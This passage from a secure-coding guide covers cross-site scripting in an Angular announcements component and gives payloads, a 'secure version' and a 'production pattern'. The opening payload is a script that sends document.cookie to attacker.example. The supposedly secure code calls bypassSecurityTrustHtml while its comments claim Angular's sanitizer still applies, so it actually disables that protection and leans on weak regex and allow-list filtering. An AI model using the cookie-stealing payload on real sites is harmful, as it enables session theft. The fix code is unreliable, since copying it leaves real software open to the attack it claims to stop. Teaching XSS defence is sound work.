**Attack Payload** (if applicable):
```html
<script>
  fetch('https://attacker.example/steal?cookie=' + encodeURIComponent(document.cookie));
</script>
```

Or as HTML that also abuses Angular template expressions (template injection):

```html
<div>{{ (this as any).constructor.constructor('alert(document.domain)')() }}</div>
```

**Why This Is Dangerous**:
- Any user or compromised backend system that can affect `/api/announcements/latest` can inject arbitrary HTML/JS.
- `[innerHTML]` bypasses Angular's normal template binding safety and tells the browser to parse and execute the HTML directly.
- Malicious scripts can steal session cookies, exfiltrate sensitive data, or perform actions as the victim (CSRF-like effects with full JS control).

**SECURE VERSION**:

```typescript
// app.module.ts
import { NgModule } from '@angular/core';
import { BrowserModule } from '@angular/platform-browser';
import { HttpClientModule, HttpClient } from '@angular/common/http';
import { Component, OnInit } from '@angular/core';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

// Simple allow-list HTML sanitizer (defense in depth on top of Angular's built-in sanitization)
function basicSanitizeHtml(input: string): string {
  // Remove all <script> tags and their content
  let sanitized = input.replace(/<script[\s\S]*?>[\s\S]*?<\/script>/gi, '');
  // Remove on* event handler attributes (onclick, onerror, etc.)
  sanitized = sanitized.replace(/on[a-z]+\s*=\s*"[^"]*"/gi, '');
  sanitized = sanitized.replace(/on[a-z]+\s*=\s*'[^']*'/gi, '');
  sanitized = sanitized.replace(/on[a-z]+\s*=\s*[^\s>]+/gi, '');
  // Optional: restrict iframes, objects, etc.
  sanitized = sanitized.replace(/<(iframe|object|embed|link|meta)[^>]*>/gi, '');
  return sanitized;
}

@Component({
  selector: 'app-announcements',
  template: `
    <h2>Announcements</h2>
    <!-- Safe: Angular sanitizes [innerHTML] by default, plus we pre-sanitize -->
    <div class="content" [innerHTML]="safeAnnouncementHtml"></div>
    <div *ngIf="loadError" class="error">Unable to load announcement.</div>
  `
})
export class AnnouncementsComponent implements OnInit {
  safeAnnouncementHtml: SafeHtml | null = null;
  loadError = false;

  constructor(
    private http: HttpClient,
    private domSanitizer: DomSanitizer
  ) {}

  ngOnInit(): void {
    this.http
      .get('/api/announcements/latest', { responseType: 'text' })
      .subscribe({
        next: (html: string) => {
          const sanitized = basicSanitizeHtml(html);
          // PRIMARY DEFENSE: rely on Angular's internal HTML sanitizer
          this.safeAnnouncementHtml = this.domSanitizer.bypassSecurityTrustHtml(
            sanitized
          );
        },
        error: (err) => {
          console.error('Failed to load announcement', err);
          this.loadError = true;
        }
      });
  }
}

@NgModule({
  declarations: [AnnouncementsComponent],
  imports: [BrowserModule, HttpClientModule],
  bootstrap: [AnnouncementsComponent]
})
export class AppModule {}
```

**Key Security Controls**:
- **Context-aware HTML sanitization**: Angular performs DOM sanitization on `[innerHTML]` bindings, stripping scripts and dangerous URLs before inserting them into the DOM.
- **Defense-in-depth allow-list filtering**: A custom `basicSanitizeHtml` function adds another layer by removing obvious dangerous constructs (script tags, event handlers, risky elements) before Angular sees the HTML.
- **Graceful error handling and logging**: The component logs backend failures and shows a generic error UI, avoiding exposure of internal details while still giving feedback to users and enabling operators to investigate suspicious conditions.

For production, centralize HTML sanitization into a reusable service and strictly define which tags and attributes are allowed. Combine this with Angular's built-in security, secure server-side handling, monitoring, and security headers.

**PRODUCTION PATTERN**:

```typescript
// safe-html.config.ts
export interface SafeHtmlConfig {
  allowedTags: Set<string>;
  allowedAttributes: Map<string, Set<string>>; // tagName -> attributes
}

export const DEFAULT_SAFE_HTML_CONFIG: SafeHtmlConfig = {
  allowedTags: new Set(['b', 'i', 'strong', 'em', 'u', 'p', 'br', 'ul', 'ol', 'li', 'a', 'span']),
  allowedAttributes: new Map<string, Set<string>>([
    ['a', new Set(['href', 'title', 'target'])],
    ['span', new Set(['class'])]
  ])
};

// safe-html.service.ts
import { Injectable, Inject } from '@angular/core';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';
import { DEFAULT_SAFE_HTML_CONFIG, SafeHtmlConfig } from './safe-html.config';

@Injectable({ providedIn: 'root' })
export class SafeHtmlService {
  constructor(
    private sanitizer: DomSanitizer,
    @Inject('SAFE_HTML_CONFIG') private config: SafeHtmlConfig
  ) {}

  sanitize(input: string): SafeHtml {
    const cleaned = this.applyAllowList(input || '');
    // Rely on Angular's internal sanitization as final guard
    return this.sanitizer.bypassSecurityTrustHtml(cleaned);
  }

  private applyAllowList(input: string): string {
    const parser = new DOMParser();
    const doc = parser.parseFromString(input, 'text/html');
    const body = doc.body;

    const walker = doc.createTreeWalker(body, NodeFilter.SHOW_ELEMENT, null);
    const toRemove: Element[] = [];

    while (walker.nextNode()) {
      const el = walker.currentNode as Element;
      const tagName = el.tagName.toLowerCase();

      if (!this.config.allowedTags.has(tagName)) {
        toRemove.push(el);
        continue;
      }

      // Remove event handlers and disallowed attributes
      const allowedAttrs = this.config.allowedAttributes.get(tagName) || new Set<string>();
      for (const attr of Array.from(el.attributes)) {
        const name = attr.name.toLowerCase();
        const value = attr.value;

        if (name.startsWith('on')) {
          el.removeAttribute(attr.name);
          continue;
        }

        if (!allowedAttrs.has(name)) {
          el.removeAttribute(attr.name);
          continue;
        }

        // Prevent javascript: URLs
        if (name === 'href' || name === 'src') {
          if (/^javascript:/i.test(value)) {
            el.removeAttribute(attr.name);
          }
        }
      }
    }

    for (const el of toRemove) {
      el.replaceWith(...Array.from(el.childNodes));
    }

    return body.innerHTML;
  }
}

// secure-html.pipe.ts
import { Pipe, PipeTransform } from '@angular/core';
import { SafeHtml } from '@angular/platform-browser';
import { SafeHtmlService } from './safe-html.service';

@Pipe({ name: 'secureHtml', pure: true })
export class SecureHtmlPipe implements PipeTransform {
  constructor(private safeHtmlService: SafeHtmlService) {}

  transform(value: string | null | undefined): SafeHtml {
    return this.safeHtmlService.sanitize(value || '');
  }
}

